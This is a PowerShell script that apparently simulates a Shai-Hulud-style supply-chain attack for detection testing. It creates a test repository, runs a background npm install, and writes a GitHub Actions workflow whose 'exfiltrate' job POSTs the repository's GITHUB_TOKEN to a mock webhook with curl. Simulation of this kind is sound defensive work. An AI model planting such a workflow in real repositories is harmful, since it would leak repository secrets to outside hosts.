#Requires -Version 5.1
<#
.SYNOPSIS
    Scenario 3: GitHub Workflow File Injection
.DESCRIPTION
    Creates a malicious GitHub Actions workflow file during package installation
#>

Write-Host "Scenario 3: GitHub Workflow File Injection" -ForegroundColor Yellow

$WorkDir = "test-repo"

# Clean up existing directory
if (Test-Path $WorkDir) {
    Remove-Item $WorkDir -Recurse -Force
}

New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
Set-Location $WorkDir

# Initialize git repository
try {
    git init 2>$null | Out-Null
    Write-Host "Initialized git repository" -ForegroundColor Cyan
}
catch {
    Write-Host "Git init failed (git may not be installed)" -ForegroundColor Yellow
}

# Create .github/workflows directory
$workflowDir = ".github\workflows"
New-Item -ItemType Directory -Path $workflowDir -Force | Out-Null

# Start background npm install
$installJob = Start-Job -ScriptBlock {
    try {
        npm install test-package 2>$null
    }
    catch {
        # Expected to fail
    }
}

Start-Sleep -Seconds 1

# Create malicious workflow file
$workflowPath = Join-Path $workflowDir "shai-hulud-workflow.yml"
$workflowContent = @'
name: Shai-Hulud Test Workflow
on: [push]
jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    steps:
      - name: Collect secrets
        run: |
          echo "Fake secret collection"
          curl -X POST $MOCK_WEBHOOK -d "secrets=${{ secrets.GITHUB_TOKEN }}"
'@

$workflowContent | Out-File -FilePath $workflowPath -Encoding UTF8

Write-Host "Created malicious workflow file: $workflowPath" -ForegroundColor Red
Write-Host "Workflow would execute on push events and attempt to exfiltrate secrets" -ForegroundColor Gray

# Clean up background job
$installJob | Stop-Job -PassThru | Remove-Job -Force

Set-Location ..
Write-Host "Scenario 3 complete" -ForegroundColor Green
